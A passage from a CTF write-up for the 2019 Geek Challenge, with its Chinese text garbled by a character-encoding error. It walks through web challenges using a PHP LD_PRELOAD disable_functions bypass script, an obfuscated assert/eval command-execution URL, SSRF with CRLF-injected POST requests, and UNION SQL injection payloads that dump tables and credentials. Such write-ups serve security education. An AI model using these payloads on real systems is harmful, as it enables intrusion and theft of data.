<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571502795907.png" alt="1571502795907"></p>
<p>é‚£ä¹ˆæ€è·¯ä¹Ÿå°±æ¸…æ™°èµ·æ¥äº†ï¼Œbypass disable_functions  æ‰§è¡Œreadflag</p>
<p>æˆ‘ä»¬è¿™é‡Œåˆ©ç”¨LD_PRELOADåŠ«æŒå…±äº«åº“ï¼Œä»è€Œæ‰§è¡Œå‘½ä»¤</p>
<p>å…·ä½“åŸç†çœ‹çœ‹<a href="https://www.cnblogs.com/leixiao-/p/10612798.html" target="_blank" rel="noopener">å‡ºé¢˜äººçš„åšå®¢</a>å’Œ<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">bypass_disablefunc_via_LD_PRELOAD</a></p>
<p>é¦–å…ˆä¸Šä¼ æ¶æ„soæ–‡ä»¶ï¼Œä¸Šé¢çš„githubé¡¹ç›®ä¸­æœ‰ï¼Œæ³¨æ„æ“ä½œç³»ç»Ÿä½æ•°</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571503296101.png" alt="1571503296101"></p>
<p>å¹¶ä¸”é‡å‘½åä¸º123.so</p>
<p>ç„¶åä¸Šä¼ 123.phpæ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    $cmd = $_GET[&quot;cmd&quot;];</span><br><span class="line">    $out_path = $_GET[&quot;outpath&quot;];</span><br><span class="line">    $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);</span><br><span class="line"></span><br><span class="line">    $so_path = $_GET[&quot;sopath&quot;];</span><br><span class="line">    putenv(&quot;LD_PRELOAD=&quot; . $so_path);</span><br><span class="line"></span><br><span class="line">    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; </span><br><span class="line"></span><br><span class="line">    unlink($out_path);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>ç„¶åé€šè¿‡include()åŒ…å«æ–‡ä»¶ï¼Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$_=%22`&#123;&#123;&#123;%22^%22?%3C%3E/%22;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=var_dump(eval($_GET[a]))&amp;a=include(%27/tmp/123.php%27);&amp;cmd=./../../../readflag&amp;outpath=/tmp/123.txt&amp;sopath=/tmp/123.so</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571503618681.png" alt="1571503618681"></p>
<h2 id="æä¸‰çš„ä»£ç å®¡è®¡ç¬”è®°ç¬¬ä¸€é¡µï¼šTalk-is-easy-show-me-the-code"><a href="#æä¸‰çš„ä»£ç å®¡è®¡ç¬”è®°ç¬¬ä¸€é¡µï¼šTalk-is-easy-show-me-the-code" class="headerlink" title="æä¸‰çš„ä»£ç å®¡è®¡ç¬”è®°ç¬¬ä¸€é¡µï¼šTalk is easy ,show me the code."></a>æä¸‰çš„ä»£ç å®¡è®¡ç¬”è®°ç¬¬ä¸€é¡µï¼šTalk is easy ,show me the code.</h2><p>è®¿é—®é¢˜ç›®é¡µé¢ï¼Œç»™äº†æºç </p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(E_ALL);</span><br><span class="line">    ini_set(<span class="string">"max_execution_time"</span>, <span class="string">"60"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">empty</span>($_GET[<span class="string">"url"</span>]) &amp;&amp; <span class="keyword">die</span>();</span><br><span class="line">    $password = <span class="string">"If I knew where I would die, I would never go there."</span>;</span><br><span class="line">    $arr = explode(<span class="string">' '</span>, $password);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">startsWith</span><span class="params">($haystack, $needle)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">         $length = strlen($needle);</span><br><span class="line">         <span class="keyword">return</span> (substr($haystack, <span class="number">0</span>, $length) === $needle);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $url = $_GET[<span class="string">"url"</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!startsWith($url,<span class="string">"http://"</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Not allow !"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;count($arr); $i++)  </span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">FALSE</span>); </span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="keyword">FALSE</span>); </span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">3</span>); </span><br><span class="line">        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="keyword">false</span>);</span><br><span class="line">        $output = curl_exec($ch); </span><br><span class="line">        curl_close($ch);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ($output === $arr[$i])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>($i == sizeof($arr)<span class="number">-1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Congratulations. Flag is  SYC&#123;********************************&#125;"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;   </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"password is wrong"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨å…·æœ‰å…¬ç½‘IPçš„æœåŠ¡å™¨ä¸Šï¼Œæ”¾ç½®ä»¥ä¸‹ä¸¤ä¸ªæ–‡ä»¶</p>
<p>req.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password = <span class="string">"If I knew where I would die, I would never go there."</span>;</span><br><span class="line">$arr = explode(<span class="string">' '</span>, $password);</span><br><span class="line">$count=intval(file_get_contents(<span class="string">"1.txt"</span>));</span><br><span class="line"><span class="keyword">echo</span> $arr[$count];</span><br><span class="line"></span><br><span class="line">$count++;</span><br><span class="line">$file=fopen(<span class="string">"1.txt"</span>,<span class="string">"w+"</span>);</span><br><span class="line">fwrite($file,$count);</span><br><span class="line">fclose($file);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>1.txt</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191101124245849.png" alt="image-20191101124245849"></p>
<p>1.txtè¦æœ‰å¯å†™æƒé™</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191101124431268.png" alt="image-20191101124431268"></p>
<h2 id="æœåŠ¡ç«¯æ£€æµ‹ç³»ç»Ÿï¼šemmï¼Œè‡ªå·±çœ‹"><a href="#æœåŠ¡ç«¯æ£€æµ‹ç³»ç»Ÿï¼šemmï¼Œè‡ªå·±çœ‹" class="headerlink" title="æœåŠ¡ç«¯æ£€æµ‹ç³»ç»Ÿï¼šemmï¼Œè‡ªå·±çœ‹"></a>æœåŠ¡ç«¯æ£€æµ‹ç³»ç»Ÿï¼šemmï¼Œè‡ªå·±çœ‹</h2><p>SSRFè¿˜æ²¡æœ‰å†™è¿‡é¢˜ç›®ï¼Œåˆ©ç”¨å¤ç°å­¦ä¹ ä¸€ä¸‹</p>
<p>é¦–å…ˆæœ‰ä¸ªadmin.php</p>
<p>ä½†è¦æ±‚127.0.0.1æ‰èƒ½è®¿é—®</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191211164956360.png" alt="image-20191211164956360"></p>
<p>æœ‰index.phpçš„æºç ï¼Œ</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191211164910208.png" alt="image-20191211164910208"></p>
<p>è¿™é‡Œåˆ©ç”¨index.php SSRFè®¿é—®admin.php</p>
<p>ä½†è¦ç»•è¿‡â€œ/anythingâ€</p>
<p>è¿™é‡Œå¯ä»¥æ„é€ url=<a href="http://127.0.0.1/admin.php?&amp;method=GET" target="_blank" rel="noopener">http://127.0.0.1/admin.php?&amp;method=GET</a></p>
<p>è¿™æ ·â€œ/anythingâ€ å°±æˆäº†ä¸€ä¸ªå‚æ•°</p>
<p>æ˜¾ç¤ºfailedæ˜¯å› ä¸ºé‡‡ç”¨GETè¯·æ±‚æ–¹å¼ï¼ŒæœåŠ¡ç«¯æ˜¯ä¸ä¼šè¿”å›Allowå¤´çš„ï¼Œè€Œä¸”è¿™é‡Œçš„SSRFæ²¡æœ‰å›æ˜¾ï¼Œåªæœ‰ä¸€ä¸ªæ˜¾ç¤ºå“åº”ä½“é•¿åº¦çš„è¯­å¥</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191211195729531.png" alt="image-20191211195729531"></p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">sprintf</span>(<span class="string">"body length of $method%d"</span>, $body);</span><br></pre></td></tr></table></figure>

<p>è¿™å¥ $methodå¯æ§ï¼Œæ‰€ä»¥ä¼ å…¥%s% è¦†ç›–å %s%%d åŒç™¾åˆ†å·è¿”å›ä¸€ä¸ª%,ä½†è¿™æ—¶ %d å·²ç»æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191211202422540.png" alt="image-20191211202422540"></p>
<p>å¾—åˆ°admin.phpçš„æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">"127.0.0.1"</span>) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span> (@$_POST[<span class="string">"iwantflag"</span>] == <span class="string">"yes"</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"only 127.0.0.1 can visit it"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…³äºHTTPå¤´</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">httpå¤´çš„æ ¼å¼ï¼š</span><br><span class="line"></span><br><span class="line">è¯·æ±‚æ–¹æ³• /è·¯å¾„ HTTP/ç‰ˆæœ¬</span><br><span class="line">å¤´å­—æ®µ: å€¼</span><br><span class="line"></span><br><span class="line">æ¯”å¦‚ï¼š</span><br><span class="line">GET /index.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure>

<p>httpå¤´éƒ¨çš„å„ä¸ªå­—æ®µä¹‹é—´ç”¨CRLF(\r\n)(%0d%0a)åˆ†å‰²<br>httpè¯·æ±‚å¤´(å“åº”å¤´)å’Œè¯·æ±‚ä½“(å“åº”ä½“)ä¹‹é—´ç”¨ä¸¤ä¸ªCRLFåˆ†å‰²</p>
<p>å…³äºHttpè¯·æ±‚</p>
<p>getè¯·æ±‚:</p>
<pre><code>GET / HTTP/1.1
Host: 127.0.0.1</code></pre><p>postè¯·æ±‚</p>
<pre><code>POST / HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-from-urlencoded
Content-Length: 3

x=1</code></pre><p>httpå¤´çš„å­—æ®µï¼ˆå¸¸è§ï¼‰<br>        Host</p>
<pre><code>ç”¨äºå¤šä¸ªåŸŸåæ˜ å°„åˆ°åŒä¸€ä¸ªipæ—¶ï¼ŒæŒ‰ç…§Hostçš„å†…å®¹åŒ¹é…ä¸åŒç½‘ç«™å†…å®¹ï¼Œæ¯ä¸ªHttpå¤´å¿…é¡»æœ‰Hostå¤´
å½“è¿™ä¸ªç›®çš„ä¸»æœºä¸Šåªæœ‰ä¸€ä¸ªç½‘ç«™ï¼Œé‚£ä¹ˆHostå­—æ®µå†…å®¹å¯ä»¥ä¸ºä»»æ„å€¼</code></pre><p>Content-Type</p>
<p>è¡¨æ˜å†…å®¹éƒ¨åˆ†çš„ç¼–ç æ ¼å¼å’Œåª’ä½“ç±»å‹ post/putç­‰æ–¹å¼å¿…é¡»æœ‰(å¦‚æœæœ‰è¯·æ±‚ä½“)</p>
<p>è¯·æ±‚å¤´ä¸­çš„Content-Type<br>GETè¯·æ±‚:<br>GETæ²¡æœ‰è¯·æ±‚å®ä½“éƒ¨åˆ†ï¼Œæ‰€ä»¥è¯·æ±‚å¤´ä¸­ä¸éœ€è¦è®¾ç½®Content-Typeå­—æ®µ<br>POST/PUTè¯·æ±‚<br>å¦‚æœpost/putè¯·æ±‚æœ‰è¯·æ±‚ä½“(æœ‰ä¼ å€¼)ï¼Œé‚£ä¹ˆå¿…é¡»è¦è®¾ç½®Content-Typeå­—æ®µ(å¦åˆ™æœåŠ¡ç«¯å¯èƒ½æ— æ³•å¤„ç†ä½ çš„è¯·æ±‚)</p>
<pre><code>ç¬¬ä¸€ç±»ï¼šrawåŸå§‹ç±»å‹ï¼Œå¯ä»¥ä¸Šä¼ ä»»æ„æ ¼å¼çš„æ–‡æœ¬ï¼Œæ¯”å¦‚textã€jsonã€xmlã€htmlâ€¦(ä¸­æ–‡ä¸è¿›è¡Œç¼–ç )
textè¯·æ±‚ï¼šContent-Type: text/plain
jsonè¯·æ±‚ï¼šContent-Type: application/json
htmlè¯·æ±‚ï¼šContent-Type: text/html
ç¬¬äºŒç±»ï¼šapplication/x-www-from-urlencodedï¼Œä¼šå°†è¡¨å•å†…çš„æ•°æ®è½¬æ¢æ‹¼æ¥æˆkey-valueå¯¹(å¯¹éasciiç è¿›è¡Œç¼–ç )
Content-Type: application/x-www-from-urlencoded
ç¬¬ä¸‰ç±»ï¼šmultipart/from-dataï¼Œå°†è¡¨å•çš„æ•°æ®å¤„ç†ä¸ºä¸€æ¡æ¶ˆæ¯ï¼Œä»¥æ ‡ç­¾ä¸ºå•å…ƒï¼Œç”¨åˆ†éš”ç¬¦åˆ†å¼€ã€‚æ—¢å¯ä»¥ä¸Šä¼ é”®å€¼å¯¹ï¼Œä¹Ÿå¯ä»¥ä¸Šä¼ æ–‡ä»¶ã€‚
Content-Type: multipart/from-data;boundary=xxx
åœ¨è¯·æ±‚ä½“ä¸­ä¼šæœ‰ä¸€ä¸ªContent-Dispositionå­—æ®µï¼Œç”¨äºæè¿°æäº¤çš„è¡¨å•çš„å…·ä½“ä¿¡æ¯</code></pre><p>å“åº”å¤´ä¸­çš„Content-Typeï¼š<br> ç”¨æ¥å‘Šè¯‰å®¢æˆ·ç«¯ï¼ŒæœåŠ¡ç«¯è¿”å›çš„çœŸå®å†…å®¹ç±»å‹æ˜¯ä»€ä¹ˆã€‚æµè§ˆå™¨æˆ–å®¢æˆ·ç«¯ä¼šæ ¹æ®è¿™ä¸ªå€¼æ¥åšä¸€äº›æ“ä½œã€‚</p>
<p> Content-Length è¡¨ç¤ºå†…å®¹éƒ¨åˆ†çš„é•¿åº¦ post/putç­‰æ–¹å¼å¿…é¡»æœ‰(å¦‚æœæœ‰è¯·æ±‚ä½“)</p>
<p>åœ¨æºç ä¸­ä½¿ç”¨çš„æ˜¯stream_context_create()å‡½æ•°å‘èµ·HTTPè¯·æ±‚</p>
<p>è¿™é‡Œå¦‚httpåè®®å¤´ç­‰ä¸€äº›ä¿¡æ¯ï¼Œä½œä¸ºä¸€ä¸ªæ•°ç»„ä¼ å…¥ã€‚æ‰€ä»¥æˆ‘ä»¬èƒ½åˆ©ç”¨CRLFæ„é€ ä¸€ä¸ªæ–°çš„POSTåŒ…</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191212220127675.png" alt="image-20191212220127675"></p>
<p>è¿™é‡Œæˆ‘ä»¬æŠŠurlæ”¹æˆè‡ªå·±æœåŠ¡å™¨çš„ipï¼Œçœ‹çœ‹ç»è¿‡å¤„ç†åçš„POSTæ˜¯ä»€ä¹ˆæ ·å­ã€‚</p>
<p>è¿™ä¸ªPOSTåŒ…æœ€åä¹ŸåŠ ä¸Šäº†ä¸€äº›å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥ä¸ºäº†é˜²æ­¢iwantflagå‚æ•°è¢«æ±¡æŸ“ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼ å…¥ç¬¬äºŒä¸ªå‚æ•°b</p>
<p>è€Œä¸”ä¸ºäº†ä»index.phpå¾—åˆ°å›æ˜¾ï¼Œæˆ‘ä»¬ä¾æ—§è¦è¦†ç›– %d æ‰€ä»¥id=%s% </p>
<p>è¿˜æœ‰ä¸€ç‚¹ï¼Œ&amp;åœ¨URLä¸­æ˜¯å…·æœ‰åˆ†å‰²å‚æ•°çš„ä½œç”¨ï¼Œæ‰€ä»¥è¦è¿›è¡ŒURLç¼–ç </p>
<p>æœ€åçš„payloadå¦‚ä¸‹</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191212074711793.png" alt="image-20191212074711793"></p>
<h2 id="Lovelysqlï¼šä¸Šæ¬¡æ˜¯æˆ‘ç²—å¿ƒå¤§æ„ï¼Œçœ‹æ¥ä¸èƒ½ç›´æ¥æ”¾åœ¨ç½‘é¡µä¸Šäº†ï¼"><a href="#Lovelysqlï¼šä¸Šæ¬¡æ˜¯æˆ‘ç²—å¿ƒå¤§æ„ï¼Œçœ‹æ¥ä¸èƒ½ç›´æ¥æ”¾åœ¨ç½‘é¡µä¸Šäº†ï¼" class="headerlink" title="Lovelysqlï¼šä¸Šæ¬¡æ˜¯æˆ‘ç²—å¿ƒå¤§æ„ï¼Œçœ‹æ¥ä¸èƒ½ç›´æ¥æ”¾åœ¨ç½‘é¡µä¸Šäº†ï¼"></a>Lovelysqlï¼šä¸Šæ¬¡æ˜¯æˆ‘ç²—å¿ƒå¤§æ„ï¼Œçœ‹æ¥ä¸èƒ½ç›´æ¥æ”¾åœ¨ç½‘é¡µä¸Šäº†ï¼</h2><p>ç†Ÿæ‚‰çš„ç•Œé¢</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191101125127520.png" alt="image-20191101125127520"></p>
<p>åŒæ ·çš„æ‰‹æ³•</p>
<figure class="highlight fix"><table><tr><td class="code"><pre><span class="line"><span class="attr">â€˜</span>=<span class="string">â€™</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">â€˜=â€™</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191101201215464.png" alt="image-20191101201215464"></p>
<p>ä½†è¿™ä¸ªå­—ç¬¦ä¸²å¹¶ä¸æ˜¯flagï¼Œä¼°è®¡åœ¨æ•°æ®åº“ä¸­</p>
<p>åˆ©ç”¨Payloadæµ‹è¯•ï¼Œç¦ç”¨äº† insertï¼Œhavingç­‰ï¼Œå¯ä»¥åˆ©ç”¨<code>#</code> é—­åˆã€‚</p>
<p>å¯ä»¥è”åˆæ³¨å…¥ï¼ŒæŠ¥é”™æ³¨å…¥ï¼Œç›²æ³¨ã€‚</p>
<p>è¿™é‡Œç”¨æœ€ç®€å•çš„è”åˆæ³¨å…¥ã€‚</p>
<p>å…ˆåˆ¤æ–­å­—æ®µæ•°</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191101202502733.png" alt="image-20191101202502733"></p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191101202533747.png" alt="image-20191101202533747"></p>
<p>å­—æ®µæ•°ä¸º3</p>
<p>è·å–å›æ˜¾ç‚¹</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191101203249710.png" alt="image-20191101203249710"></p>
<p>è·å–æ•°æ®åº“å</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username=1%27union+select+1,2,group_concat(schema_name)+from+information_schema.schemata%23&amp;password=123</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191101203821862.png" alt="image-20191101203821862"></p>
<p>å…ˆå…³æ³¨geekæ•°æ®åº“ï¼ŒæŸ¥è¡¨</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username=1%27union+select+1,2,group_concat(table_name)+from+information_schema.tables+where+table_schema%3d&apos;geek&apos;%23&amp;password=123</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191101204140891.png" alt="image-20191101204140891"></p>
<p>æŸ¥l0ve1ysq1è¡¨çš„å­—æ®µ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username=1%27union+select+1,2,group_concat(column_name)+from+information_schema.columns+where+table_schema%3d&apos;geek&apos;+and+table_name%3d&apos;l0ve1ysq1&apos;%23&amp;password=123</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191101204909589.png" alt="image-20191101204909589"></p>
<p>è·å–æ•°æ®</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username=1%27union+select+1,2,group_concat(id,username,password)+from+geek.l0ve1ysq1+%23&amp;password=123</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191101213948365.png" alt="image-20191101213948365"></p>
<h2 id="æ€§æ„Ÿé»„é˜¿å§¨ï¼Œåœ¨çº¿èŠå¤©-å¬è¯´å¥¹æœ‰å¾ˆå¤šå°ç§˜å¯†å’Œè¡¨æƒ…åŒ…å“¦ï¼Œå½“ç„¶ä¹Ÿæœ‰ä½ ä»¬æœ€æƒ³è¦çš„flagï¼"><a href="#æ€§æ„Ÿé»„é˜¿å§¨ï¼Œåœ¨çº¿èŠå¤©-å¬è¯´å¥¹æœ‰å¾ˆå¤šå°ç§˜å¯†å’Œè¡¨æƒ…åŒ…å“¦ï¼Œå½“ç„¶ä¹Ÿæœ‰ä½ ä»¬æœ€æƒ³è¦çš„flagï¼" class="headerlink" title="æ€§æ„Ÿé»„é˜¿å§¨ï¼Œåœ¨çº¿èŠå¤©:å¬è¯´å¥¹æœ‰å¾ˆå¤šå°ç§˜å¯†å’Œè¡¨æƒ…åŒ…å“¦ï¼Œå½“ç„¶ä¹Ÿæœ‰ä½ ä»¬æœ€æƒ³è¦çš„flagï¼"></a>æ€§æ„Ÿé»„é˜¿å§¨ï¼Œåœ¨çº¿èŠå¤©:å¬è¯´å¥¹æœ‰å¾ˆå¤šå°ç§˜å¯†å’Œè¡¨æƒ…åŒ…å“¦ï¼Œå½“ç„¶ä¹Ÿæœ‰ä½ ä»¬æœ€æƒ³è¦çš„flagï¼</h2><p>bpæŠ“åŒ…</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191031113746614.png" alt="image-20191031113746614"></p>
<p>å°è¯•æŠŠguestæ”¹æˆadmin</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191031114019083.png" alt="image-20191031114019083"></p>
<p>æç¤ºæˆ‘ä»¬è¦ç»•è¿‡è¿™ä¸ªåˆ¤æ–­</p>
<p>ä¸¤ä¸ªç­‰å·ï¼Œç¬¬ä¸€æ—¶é—´æƒ³åˆ°çš„æ˜¯phpå¼±ç±»å‹</p>
<p>åˆ©ç”¨å­—ç¬¦ä¸²å’Œæ•°å­—çš„æ¯”è¾ƒå¼±ç‚¹</p>
<p>md5åŠ å¯†è‚¯å®šæ˜¯ä¸ªå­—ç¬¦ä¸²ï¼Œå¦‚æœç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å­—æ¯è½¬åŒ–ä¸ºæ•°å­—åˆ™ä¸º0ï¼Œå¦‚æœå‰ä¸¤ä¸ªå­—ç¬¦æ˜¯â€œ1wâ€ï¼Œé‚£ä¹ˆè½¬åŒ–ä¸ºæ•°å­—åˆ™ä¸º1.</p>
<p>æ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨nameä¼ è¾“æ•°å­—ï¼Œçˆ†ç ´md5($flag)å‰é¢çš„æ•°å­—å³å¯ç»•è¿‡ã€‚</p>
<p>åœ¨jsonä¸­ï¼Œâ€œnameâ€:â€0â€æ˜¯å­—ç¬¦ä¸²ï¼Œâ€nameâ€:0 æ˜¯æ•°å­—</p>
<p>é…ç½®æµ‹è¯•å™¨</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191031115415135.png" alt="image-20191031115415135"></p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191031115443975.png" alt="image-20191031115443975"></p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191031115642982.png" alt="image-20191031115642982"></p>
<p>æ”¹æˆ<a href="https://4o4notfound.org/index.php/archives/29/" target="_blank" rel="noopener">xml</a>å½¢å¼ï¼ŒConnect-Typeæ”¹æˆxml</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191031122255387.png" alt="image-20191031122255387"></p>
<p>åˆ©ç”¨PHP<a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/" target="_blank" rel="noopener">ä¼ªåè®®</a>å’Œbase64åŠ å¯†è¯»å–æ–‡ä»¶å†…å®¹</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191031124114147.png" alt="image-20191031124114147"></p>
<p>base64è§£ç å¾—åˆ°flag</p>
<h2 id="æä¸‰çš„ä»£ç å®¡è®¡ç¬”è®°ç¬¬äºŒé¡µ"><a href="#æä¸‰çš„ä»£ç å®¡è®¡ç¬”è®°ç¬¬äºŒé¡µ" class="headerlink" title="æä¸‰çš„ä»£ç å®¡è®¡ç¬”è®°ç¬¬äºŒé¡µ"></a>æä¸‰çš„ä»£ç å®¡è®¡ç¬”è®°ç¬¬äºŒé¡µ</h2><p>æ ¹æ®é¢˜ç›®æç¤ºï¼Œä¸‹è½½æºç </p>
